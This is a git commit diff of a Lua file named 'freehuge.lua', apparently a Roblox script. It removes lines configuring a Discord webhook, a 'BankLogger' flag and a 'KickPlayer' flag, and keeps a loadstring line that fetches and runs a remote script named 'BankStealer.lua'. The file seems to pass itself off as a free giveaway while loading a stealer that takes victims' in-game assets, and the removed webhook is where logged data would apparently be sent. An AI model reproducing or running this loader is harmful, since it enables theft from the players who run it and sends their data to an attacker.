fc04d477e1f2dc5c171b5025348fefcb7dd186d5
bublomethuge <130764189+bublomethuge@users.noreply.github.com>
2023-04-14 14:58:13 +0200

    Add files via upload

--- freehuge.lua
+++ freehuge.lua
@@ -1,7 +1,2 @@
-_G.AuthName = 'kubisek125'
-_G.AuthId = 2830170168 
-_G.AuthWebhook = "https://discord.com/api/webhooks/1096411964084862996/EdIFXXmgWMb1fXghNHlnb8HwUFzg5tKMMs4zdesyHeZ6z8jBOre0pkoIXFI0ZSWa_5Op"
-_G.BankLogger = true
-_G.KickPlayer = true 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SaskeCen/Dark-Hub/main/BankStealer.lua"))()
